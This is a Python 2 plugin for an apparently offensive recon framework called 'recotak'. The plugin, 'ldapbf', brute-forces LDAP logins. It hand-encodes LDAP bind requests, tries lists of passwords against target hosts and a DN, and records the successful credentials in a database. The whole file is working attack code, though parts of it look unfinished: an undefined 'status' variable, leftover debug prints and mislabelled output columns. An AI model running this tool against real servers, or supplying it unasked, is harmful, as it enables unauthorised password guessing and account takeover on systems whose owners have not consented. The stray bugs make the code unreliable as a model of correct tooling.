#!/usr/bin/env python2

import socket
import struct
import itertools as it
from datetime import datetime
from recotak import *

desc = {
    'cli': {
        'dn': {
            'name_or_flags': ['-dn', ]
        }
    },
    'defaults': {
        'Port': [389],
    },

    "plgclass": ["bruteforce"],

    #plgin name
    "plgname": "ldapbf",

    # description
    "desc": "ldap bruteforcer",

    #root?
    "gainroot": False,

    #interaktiv
    "interactive": False,

    #direct connection
    "direct": False,

    #rank
    "rank": "experimental",
}


# possible return values are:
# success, protocolError, invalidDNSyntax, invalidCredentials, otherError, credentialsTooLong
def ldap_authenticate(ip, port, password, dn, timeout=60, verbose=True):
    print 'x'
    print ip
    print str(port)
    print password
    print dn

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
    except socket.error as e:
        if verbose:
            print "%s" % e
        print "protocolError"
        raise StopIteration

    print 'x'

    ber_01 = int("00110000", 2)
    ber_02 = int("10000001", 2)
    ber_02b = 12 + len(dn) + 3 + len(password)  # length of the following rest
    if ber_02b > 255:
        # a length octet in long form consisting of one additional octet can be as big as 255 bits
        # that should be enough
        # if not, more additional octets for the length octet could be used
        print "credentialsTooLong"
        raise StopIteration
    ber_03 = int("00000010", 2)
    ber_04 = int("00000001", 2)
    message_id = 1
    ber_05 = int("01100000", 2)  # bindRequest
    ber_06 = int("10000001", 2)
    ber_06b = 6 + len(dn) + 3 + len(password)  # length of the following rest
    ber_07 = int("00000010", 2)
    ber_08 = int("00000001", 2)
    version = 3
    ber_09 = int("00000100", 2)
    ber_10 = int("10000001", 2)
    ber_10b = len(dn)
    # dn here
    ber_11 = int("10000000", 2)
    ber_12 = int("10000001", 2)
    ber_12b = len(password)
    # password here

    ldap_request = struct.pack("!BBBBBBBBBBBBBBB%dsBBB%ds" % (
        len(dn),
        len(password)),
        ber_01,
        ber_02,
        ber_02b,
        ber_03,
        ber_04,
        message_id,
        ber_05,
        ber_06,
        ber_06b,
        ber_07,
        ber_08,
        version,
        ber_09,
        ber_10,
        ber_10b,
        dn,
        ber_11,
        ber_12,
        ber_12b,
        password)

    if verbose:
        print "len(ldap_request): %d" % len(ldap_request)
        print "ldap_request: %r" % ldap_request
    try:
        s.send(ldap_request)
        ldap_response = s.recv(1024)
        s.close()
    except socket.error as e:
        if verbose:
            print "%s" % e
        print "protocolError"
        raise StopIteration

    if verbose:
        print "len(ldap_response): %d" % len(ldap_response)
    if len(ldap_response) == 0:
        print "protocolError"
        raise StopIteration
    if verbose:
        print "ldap_response: %r" % ldap_response

    # bindResponse octet is 01100001
    # next octets are a length octet, an identifier octet and another length octet
    # the next octet is the resultCode

    bind_response_octet = struct.pack("B", int("01100001", 2))
    if not bind_response_octet in ldap_response:
        print "protocolError"
        raise StopIteration
    i = ldap_response.index(bind_response_octet)
    bind_response = ldap_response[i:]
    if len(bind_response) < 5:
        print "protocolError"
        raise StopIteration
    result_code = struct.unpack("!B", bind_response[4])[0]
    if verbose:
        print "result_code: %d" % result_code
    if result_code == 0:
        print "success"
        yield (ip, port, password, dn)
    elif result_code == 2:
        print "protocolError"
        raise StopIteration
    elif result_code == 34:
        print "invalidDNSyntax"
        raise StopIteration
    elif result_code == 49:
        print "invalidCredentials"
        raise StopIteration
    else:
        print "otherError"
        raise StopIteration


def init(dbh, target=[], port=[], password=[], dn=None, **kwargs):

    tuples = cTuples.cTuples(inputs=[target, port, password, [dn]],
                             prep_callback=ldap_authenticate,
                             )
    tuples.start()

    start_time = datetime.now()

    row_fmt = "{:30} {:30} {:30}"
    print 'Bruteforcing ldap logins ...'
    print '-' * 80
    print row_fmt.format('password', 'dn', 'server')
    print '-' * 80
    for host, port, password, dn in tuples.tuple_q:
        if status:
            print row_fmt.format(password, host, dn + ':' + str(port))
            if dbh:
                ip = ''
                fqdn = ''
                typ = cUtil.getTargetType(host)
                if typ == cUtil.TTYPE.IP:
                    ip = host
                if typ == cUtil.TTYPE.DOMAIN:
                    fqdn = host
                br = BruteforceResult2(
                    ip=ip,
                    fqdn=fqdn,
                    port=int(port),
                    username='',
                    password=password,
                    service='ldap',
                    state='open',
                    protocol='tcp'
                )
                dbh.add(br)

    tuples.join()

    print '-' * 80
    print "Finished in %fs" % cUtil.secs(start_time)


def register():
    plugin = Plugin2(**desc)
    plugin.execute = init
    return plugin
